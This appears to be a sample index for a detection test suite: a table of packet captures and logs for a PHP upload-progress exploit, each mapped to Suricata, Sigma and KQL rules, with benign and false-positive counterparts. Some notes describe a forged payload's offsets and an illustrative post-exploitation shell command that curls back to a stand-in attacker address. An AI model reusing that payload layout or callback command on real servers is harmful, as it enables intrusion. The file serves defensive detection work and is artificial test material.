# Sample index

| File | CVE | Path | Build | Outcome | Should trigger | Notes |
|------|-----|------|-------|---------|-----------------|-------|
| `pcaps/phpup2026-real-blob-CVE-109618-dtor0.pcap` | 109619 (filename predates the CVE split) | `FILE_DATA stall` | n/a (dtor=0) | crash (null call addr) | `9109629`, `9109630` | 5-packet TCP session. src=`203.0.113.42`. Forged blob: IS_STRING_EX@+16, IS_OBJECT_EX@+160, `system\0id\0`@+200. `PHP_SESSION_UPLOAD_PROGRESS` + PHPSESSID present. No RCE (call_addr=0). |
| `pcaps/phpup2026-benign-legitimate-upload.pcap` | — | — | — | benign | `9109627` only | 6-packet session. src=`198.51.100.7`. Single `PHP_SESSION_UPLOAD_PROGRESS` field + PHPSESSID + small JPEG (~3.8KB). No spray, no zval markers, no dangerous function strings, body < 40KB. |
| `logs/phpup2026-iis-spray-positive.log` | 109619 | `FILE_DATA stall` | n/a (dtor=0) | crash (repeated, wrong per-build offset) | sigma `7d9e1b23`, KQL T1-3/T2-3/T2-4 | W3C IIS log, 3 oversized POSTs (`cs-bytes` 48213–48301) from `203.0.113.42` to `192.0.2.10` in a 5-minute window, each `sc-status 502`. |
| `logs/phpup2026-iis-benign-upload-progress.log` | — | — | — | benign | sigma `9c4e6b31` only | W3C IIS log, one small (`cs-bytes` 4015) legitimate upload from `198.51.100.7`, `sc-status 200`. |
| `logs/phpup2026-eve-positive.json` | 109619 | `FILE_DATA stall` | n/a | alerted (no confirmed RCE) | `9109627`, `9109628`, `9109629`, `9109630`, `9109632` | Suricata `eve.json` events for one flow `203.0.113.42` → `192.0.2.10:443`, plus an outbound alert `192.0.2.10` → `203.0.113.42:8081` ~94s later (hostbit correlation). |
| `logs/phpup2026-eve-benign.json` | — | — | — | benign | `9109627` only | Single Suricata `eve.json` event, `198.51.100.7` → `192.0.2.10:443`, `sc-status 200`. |
| `logs/phpup2026-sysmonlinux-shell-spawn.log` | 109619 | n/a (post-RCE) | n/a | rce (illustrative) | sigma `4b9d2e51`, KQL T2-1/T2-2 | Sysmon-for-Linux `ProcessCreate`: `php-fpm8.2` (`www-data`) spawning `/bin/sh -c "id; whoami; curl ... 203.0.113.42:8081/cb"`. |
| `logs/phpup2026-sysmonlinux-benign-cron-fp.log` | — | — | — | benign (documented FP) | sigma `4b9d2e51` fires — expected FP | Sysmon-for-Linux `ProcessCreate`: cron-spawned `/opt/app/bin/nightly-backup.sh` as `www-data` via `/bin/sh`; parent is `/usr/sbin/cron`, not `php-fpm` — the cron FP the rule's own `falsepositives` field calls out. |
